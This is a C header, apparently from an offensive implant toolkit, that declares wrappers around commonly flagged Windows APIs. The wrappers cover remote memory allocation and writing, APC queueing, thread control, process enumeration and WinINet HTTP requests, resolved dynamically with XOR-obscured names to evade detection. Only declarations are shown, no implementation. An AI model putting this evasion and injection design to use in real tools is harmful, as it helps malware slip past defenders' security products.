/*
Whisper winapi

Contains functions that are usually flagged, and wraps them to be OPSEC safe.

Current method(s):
        - Dynamic resolution of functions using GetProcAddress:
                - WhisperCreateProcessA()
                - WhisperVirtualAllocEx()
                - WhisperWriteProcessMemory()
                - WhisperQueueUserAPC()
                - WhisperResumeThread()
                - WhisperLoadLibraryW()
                - WhisperGetUserNameW()
                - WhisperSleep()
                - WhisperCreatePipe()
                - WhisperSetHandleInformation()
                - WhisperCloseHandle()
                - WhisperWaitForSingleObject()
                - WhisperReadFile()
                - WhisperCreateThread()
                - WhisperInternetOpenA()
                - WhisperInternetOpenW()
                - WhisperInternetOpenUrlW()
                - WhisperInternetReadFile()
                - WhisperInternetCloseHandle()
                - WhisperHttpSendRequestA()
*/
#pragma once

#ifndef WHISPER_WINAPI_H
#define WHISPER_WINAPI_H

#include <stdio.h>
#include <windows.h>
#include <wininet.h> // Required for HINTERNET functions
#include <tlhelp32.h> // For WhisperCreateToolhelp32Snapshot, Process32First, Process32Next


// Function to dynamically resolve APIs
//FARPROC ResolveFunction(const wchar_t* module_name, const char* function_name);
/*
Moved from const char* to const BYTE* since XOR encryption operates on BYTE arrays. 
Using BYTE* makes it explicit that this is raw data rather than a null-terminated string, 
avoiding potential string-related issues.
*/
FARPROC ResolveFunction(const wchar_t* module_name, const BYTE* function_name); 

FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
void XorText(char *text, char key);
// Process Creation
// int WhisperSimpleCreateProcessA(LPCSTR lpApplicationName, LPSTR
// lpCommandLine, LPCSTR lpCurrentDirectory);
int WhisperCreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags,
    LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation);

// Memory Management
LPVOID WhisperVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL WhisperWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten);

// Thread Management
// DWORD WhisperQueueUserAPC(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
DWORD WhisperResumeThread(HANDLE hThread);
HANDLE WhisperCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,
    LPDWORD lpThreadId);

// Library Loading
// HMODULE WhisperLoadLibraryW(LPCWSTR lpLibFileName);

// User Information
BOOL WhisperGetUserNameW(LPWSTR lpBuffer, LPDWORD pcbBuffer);

// Sleep & Timing
void WhisperSleep(DWORD dwMilliseconds);

// Pipe Handling
BOOL WhisperCreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
BOOL WhisperSetHandleInformation(HANDLE hObject, DWORD dwMask, DWORD dwFlags);

// Handle Management
BOOL WhisperCloseHandle(HANDLE hObject);
DWORD WhisperWaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);


// WinINet API Wrappers
HINTERNET WhisperInternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass,
    DWORD dwFlags);
// HINTERNET WhisperInternetOpenW(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR
// lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags);
HINTERNET WhisperInternetOpenUrlW(HINTERNET hInternet, LPCWSTR lpszUrl, LPCWSTR lpszHeaders, DWORD dwHeadersLength,
    DWORD dwFlags, DWORD_PTR dwContext);
BOOL WhisperInternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead,
    LPDWORD lpdwNumberOfBytesRead);
BOOL WhisperInternetCloseHandle(HINTERNET hInternet);
HINTERNET WhisperInternetConnectA(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);

// HTTP Requests
BOOL WhisperHttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional,
    DWORD dwOptionalLength);
HINTERNET WhisperHttpOpenRequestA(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);

HANDLE WhisperOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
BOOL WhisperTerminateProcess(HANDLE hProcess, UINT uExitCode);
DWORD WhisperSuspendThread(HANDLE hThread);
DWORD WhisperFormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
HANDLE WhisperCreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
BOOL WhisperProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
BOOL WhisperProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
//DWORD WINAPI GetFileSize(HANDLE hFile, LPWORD lpFileSizeHigh);
BOOL WINAPI DeleteFileA(LPCSTR lpFileName);
BOOL WINAPI WriteFile(HANDLE hFile, const void *lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
BOOL WINAPI MoveFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName);
BOOL WINAPI CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
HANDLE WINAPI FindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
BOOL WINAPI FindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
BOOL WINAPI FindClose(HANDLE hFindFile);
BOOL WINAPI SetCurrentDirectoryA(LPCSTR lpPathName);
BOOL WINAPI CreateDirectoryA(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
BOOL WINAPI RemoveDirectoryA(LPCSTR lpPathName);
DWORD WINAPI GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer); // From the previous example
HANDLE WINAPI CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

void SecureFree(void* ptr, size_t size);

#endif // WHISPER_WINAPI_H
